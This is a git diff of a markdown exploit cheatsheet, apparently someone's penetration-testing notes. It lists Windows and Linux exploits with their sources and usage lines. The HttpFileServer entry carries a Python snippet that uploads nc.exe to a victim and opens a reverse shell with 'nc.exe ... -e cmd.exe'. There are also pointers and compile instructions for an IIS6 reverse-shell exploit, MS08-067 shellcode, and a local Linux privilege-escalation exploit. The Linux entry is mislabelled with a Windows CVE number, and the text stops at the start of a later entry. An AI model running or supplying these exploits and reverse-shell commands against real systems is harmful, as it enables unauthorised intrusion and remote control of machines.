@@ -1,32 +1,64 @@
 # Exploits/Tools/Cheatsheets
  
-
 ### Windows Exploits
-<details><summary>MS08-067 Python Remote Exploit</summary>
-<p>
 
-(https://www.exploit-db.com/exploits/40279)
-edit `shellcode` variable with payload and adjusts NOPS to fit it
+<details><summary>CVE-2017-7269</summary>
+<p>
+source: https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell
+
+`usage: python exploit.py <ip> <port> <attacking-ip> <attacking-port>`
 
 </p>
 </details>
 
 <details><summary>MS14-058 HttpFileServer 2.3.x RCE</summary>
 <p>
-
-(https://www.exploit-db.com/exploits/37064)
+source: https://www.exploit-db.com/exploits/37064
 Upload nc.exe into victim machine and performs a reverse shell using nc.exe
 ```python
-	#change these to your webserver for uploading nc.exe
-	ip_addr = "192.168.1.20" 
-	local_port = "80" 
-	#file will be uploaded to and run from C:\Users\Public, change ip and port here to catch your reverse shell
-	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20192.168.1.10%20443%20-e%20cmd.exe"
+    #change these to your webserver for uploading nc.exe
+    ip_addr = "192.168.1.20" 
+    local_port = "80" 
+    #file will be uploaded to and run from C:\Users\Public, change ip and port here to catch your reverse shell
+    vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20192.168.1.10%20443%20-e%20cmd.exe"
 ```
 </p>
 </details>
 
+<details><summary>MS08-067 Python Remote Exploit</summary>
+<p>
+
+source: https://www.exploit-db.com/exploits/40279
+edit `shellcode` variable with payload and adjusts NOPS to fit it
+
+</p>
+</details>
+
+
+
 ### Linux Exploits
+<details><summary>CVE-2017-7269</summary>
+<p>
+source: `searchsploit -m exploits/linux/local/18411.c`
+
+If you encountered compilation errors like:
+```c
+Compilation errors like ' error: ‘CLONE_VM’ undeclared (first use in this function); did you mean ‘CLNEXT’'
+```
+
+fix by adding the following above code:
+```c
+#define _GNU_SOURCE     
+#include <sched.h>
+```
+
+To Compile:
+`gcc 18411.c -o exploit`
+
+</p>
+</details>
+
+
 <details><summary>Linux Kernel 2.2-4 PrivEsc (ptrace-kmod)</summary>
 <p>
 
